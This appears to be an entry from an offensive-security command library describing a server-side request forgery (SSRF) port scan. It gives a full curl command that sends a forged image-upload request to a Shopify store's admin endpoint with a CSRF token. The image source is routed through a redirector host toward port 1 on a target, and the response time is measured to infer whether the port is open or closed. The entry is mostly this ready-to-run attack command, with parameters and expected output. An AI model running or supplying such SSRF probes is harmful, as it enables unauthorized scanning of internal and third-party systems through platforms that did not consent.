---
id: 123e4567-e89b-12d3-a456-426614174007
name: ssrf-scan-port-closed
type: command
executor: bash
data: >-
  curl -X POST 'https://test-4925.myshopify.com/admin/products/922460995/images'
  -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-CSRF-Token:
  F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' -w '%{time_total}' -d
  'utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:1&_method=post'
  > /dev/null
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.778Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - ssrf
  - port-scanning
verified: false
validated: true
submitted: true
---

# ssrf-scan-port-closed

## Command

```bash
curl -X POST 'https://test-4925.myshopify.com/admin/products/922460995/images' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -w '%{time_total}' \
  -d 'utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:1&_method=post' > /dev/null
```

## Description

Scans a closed port (1) via SSRF, measuring RTT to infer status.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-w '%{time_total}'` | Outputs total time | Yes |
| `image[src]` | Redirect to target:1 | Yes |

## Examples

### Basic Usage

Vary port to 2 or 3.

## Expected Output

~0.300 (printed to stdout).

## Related

- [[commands/ssrf-scan-port-open]]
- [[procedures/Perform-Port-Scanning-using-HTTP-RTT]]
